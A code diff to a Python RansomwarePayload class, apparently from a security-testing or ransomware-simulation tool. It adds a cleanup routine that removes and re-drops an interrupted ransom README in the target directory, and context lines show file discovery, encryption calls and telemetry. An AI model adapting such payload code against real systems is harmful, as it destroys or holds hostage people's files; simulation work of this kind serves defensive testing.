@@ -1,4 +1,5 @@
 import logging
+import os
 from pathlib import Path
 from typing import Callable, List
 
@@ -26,6 +27,8 @@ class RansomwarePayload:
         self._leave_readme = leave_readme
         self._telemetry_messenger = telemetry_messenger
 
+        self._readme_incomplete = False
+
     def run_payload(self):
         if not self._config.target_directory:
             return
@@ -37,7 +40,9 @@ class RansomwarePayload:
             self._encrypt_files(file_list)
 
         if self._config.readme_enabled:
+            self._readme_incomplete = True
             self._leave_readme(README_SRC, self._config.target_directory / README_FILE_NAME)
+            self._readme_incomplete = False
 
     def _find_files(self) -> List[Path]:
         logger.info(f"Collecting files in {self._config.target_directory}")
@@ -58,3 +63,18 @@ class RansomwarePayload:
     def _send_telemetry(self, filepath: Path, success: bool, error: str):
         encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
         self._telemetry_messenger.send_telemetry(encryption_attempt)
+
+    def cleanup(self):
+        if self._readme_incomplete:
+            logger.info(
+                "README.txt file dropping was interrupted. Removing corrupt file and "
+                "trying again."
+            )
+            try:
+                os.remove(self._config.target_directory / README_FILE_NAME)
+                self._leave_readme(README_SRC, self._config.target_directory / README_FILE_NAME)
+            except Exception as ex:
+                logger.info(
+                    f"An exception occurred: {str(ex)}. README.txt file dropping was "
+                    "unsuccessful."
+                )
